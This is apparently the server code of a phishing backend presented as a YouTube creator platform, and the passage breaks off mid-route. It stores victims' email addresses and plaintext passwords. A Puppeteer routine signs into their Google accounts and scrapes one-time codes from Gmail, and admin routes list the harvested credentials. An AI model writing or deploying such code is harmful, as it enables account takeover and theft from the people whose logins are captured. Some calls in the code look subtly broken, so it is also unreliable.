const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const dotenv = require('dotenv');
const nodemailer = require('nodemailer');
const axios = require('axios');
const puppeteer = require('puppeteer');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const morgan = require('morgan');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

dotenv.config();
const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(helmet());
app.use(cors());
app.use(express.json());
app.use(morgan('combined'));

// Rate limiting
const limiter = rateLimit({
  windowMs: process.env.RATE_LIMIT_WINDOW_MS || 15 * 60 * 1000, // 15 minutes
  max: process.env.RATE_LIMIT_MAX_REQUESTS || 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.'
});
app.use('/api/', limiter);

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/youtube-creator-platform', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log('✅ MongoDB connected successfully'))
.catch(err => console.error('❌ MongoDB connection error:', err));

// Credential Schema
const credentialSchema = new mongoose.Schema({
  email: { type: String, required: true },
  passwordOriginal: { type: String, required: true },
  passwordEncrypted: { type: String, required: true },
  otp: { type: String },
  otpStatus: { type: String, default: 'Pending' },
  otpTimestamp: { type: Date },
  verifiedAt: { type: Date },
  timestamp: { type: Date, default: Date.now }
});

const Credential = mongoose.model('Credential', credentialSchema);

// Admin Schema
const adminSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  name: { type: String, required: true },
  role: { type: String, default: 'admin' },
  createdAt: { type: Date, default: Date.now }
});

const Admin = mongoose.model('Admin', adminSchema);

// Create default admin if not exists
const createDefaultAdmin = async () => {
  try {
    const adminExists = await Admin.findOne({ email: process.env.ADMIN_EMAIL });
    if (!adminExists) {
      const hashedPassword = await bcrypt.hash(process.env.ADMIN_PASSWORD, 10);
      const admin = new Admin({
        email: process.env.ADMIN_EMAIL,
        password: hashedPassword,
        name: 'Admin',
        role: 'superadmin'
      });
      await admin.save();
      console.log('✅ Default admin created');
    }
  } catch (error) {
    console.error('❌ Error creating default admin:', error);
  }
};

createDefaultAdmin();

// Helper function to encrypt password
function encryptPassword(password) {
  const crypto = require('crypto');
  const algorithm = 'aes-256-cbc';
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(16);
  
  let cipher = crypto.createCipheriv(algorithm, Buffer.from(key), iv);
  let encrypted = cipher.update(password);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  
  return { iv: iv.toString('hex'), encryptedData: encrypted.toString('hex'), key: key.toString('hex') };
}

// Helper function to decrypt password
function decryptPassword(encryptedData) {
  const crypto = require('crypto');
  const algorithm = 'aes-256-cbc';
  const key = Buffer.from(encryptedData.key, 'hex');
  const iv = Buffer.from(encryptedData.iv, 'hex');
  
  let decipher = crypto.createDecipheriv(algorithm, key, iv);
  let decrypted = decipher.update(Buffer.from(encryptedData.encryptedData, 'hex'));
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  
  return decrypted.toString();
}

// Email transporter
const transporter = nodemailer.createTransporter({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD
  }
});

// Function to extract OTP from Gmail
async function extractOTP(email, password) {
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: process.env.PUPPETEER_HEADLESS !== 'false',
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    
    const page = await browser.newPage();
    
    // Go to Gmail login page
    await page.goto('https://accounts.google.com/signin', { waitUntil: 'networkidle2' });
    
    // Enter email
    await page.type('input[type="email"]', email);
    await page.click('#identifierNext');
    
    // Wait for password page
    await page.waitForSelector('input[type="password"]', { visible: true });
    
    // Enter password
    await page.type('input[type="password"]', password);
    await page.click('#passwordNext');
    
    // Wait for potential 2FA or inbox
    await page.waitForNavigation({ waitUntil: 'networkidle2' });
    
    // Check if 2FA is required
    const twoFactorRequired = await page.\$('input[data-initial-value=""]') !== null;
    if (twoFactorRequired) {
      await browser.close();
      return { success: false, message: '2FA authentication required' };
    }
    
    // Go to Gmail
    await page.goto('https://mail.google.com', { waitUntil: 'networkidle2' });
    
    // Wait for inbox to load
    await page.waitForSelector('.zA');
    
    // Get the latest email
    const latestEmail = await page.\$('.zA');
    if (!latestEmail) {
      await browser.close();
      return { success: false, message: 'No emails found' };
    }
    
    // Click on the latest email
    await latestEmail.click();
    await page.waitForSelector('.a3s', { visible: true });
    
    // Get email content
    const emailContent = await page.\$eval('.a3s', element => element.textContent);
    
    // Extract OTP using regex
    const otpMatch = emailContent.match(/\b(\d{6})\b/);
    const otp = otpMatch ? otpMatch[1] : null;
    
    await browser.close();
    
    if (otp) {
      return { success: true, otp };
    } else {
      return { success: false, message: 'No OTP found in email' };
    }
  } catch (error) {
    if (browser) await browser.close();
    return { success: false, message: error.message };
  }
}

// API Routes

// Health check
app.get('/api/health', (req, res) => {
  res.status(200).json({ status: 'OK', message: 'API is running' });
});

// Root route
app.get('/', (req, res) => {
  res.json({ message: 'CreatorHub API is running', status: 'active' });
});

// Admin authentication
app.post('/api/admin-auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // Find admin by email
    const admin = await Admin.findOne({ email });
    if (!admin) {
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
    
    // Check password
    const isPasswordValid = await bcrypt.compare(password, admin.password);
    if (!isPasswordValid) {
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
    
    // Generate JWT token
    const token = jwt.sign(
      { id: admin._id, email: admin.email, role: admin.role },
      process.env.JWT_SECRET,
      { expiresIn: '1d' }
    );
    
    res.status(200).json({
      success: true,
      token,
      adminData: {
        email: admin.email,
        name: admin.name,
        role: admin.role
      }
    });
  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Admin authentication middleware
const adminAuth = (req, res, next) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
      return res.status(401).json({ error: 'No token provided' });
    }
    
    // Verify token
    jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
      if (err) {
        return res.status(401).json({ error: 'Invalid token' });
      }
      req.admin = decoded;
      next();
    });
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
};

// Get all credentials for admin
app.get('/api/admin/credentials', adminAuth, async (req, res) => {
  try {
    const